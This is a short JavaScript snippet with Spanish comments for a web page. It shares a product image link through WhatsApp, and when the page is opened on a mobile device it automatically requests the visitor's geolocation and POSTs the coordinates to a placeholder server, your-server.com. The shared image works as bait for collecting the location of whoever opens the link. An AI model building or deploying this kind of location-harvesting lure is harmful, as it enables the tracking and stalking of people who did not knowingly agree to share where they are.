// URL de la imagen pública
const imageUrl = "/public/product.jpg";  // Asegúrate de subir esta imagen a Netlify

// Enviar la imagen al teléfono (Ejemplo: WhatsApp)
document.getElementById("sendImage").href = `https://api.whatsapp.com/send?text=Mira esta imagen: ${window.location.origin}${imageUrl}`;

// Función para obtener la ubicación cuando el usuario abre la página en su teléfono
function sendLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Mostrar la ubicación en la página
            document.getElementById("location").textContent = `Latitud: ${latitude}, Longitud: ${longitude}`;

            // Crear un enlace a Google Maps
            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            const linkElement = document.getElementById("mapsLink");
            linkElement.href = mapsLink;
            linkElement.style.display = "block";

            // Opcional: Enviar la ubicación a un servidor
            fetch('https://your-server.com/sendLocation', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude, longitude })
            });

            alert(`Ubicación enviada: Latitud: ${latitude}, Longitud: ${longitude}`);
        });
    } else {
        alert("Geolocalización no soportada en este dispositivo.");
    }
}

// Verificar si la página se abre en un teléfono (para enviar la ubicación)
if (/Mobi|Android/i.test(navigator.userAgent)) {
    sendLocation();
}
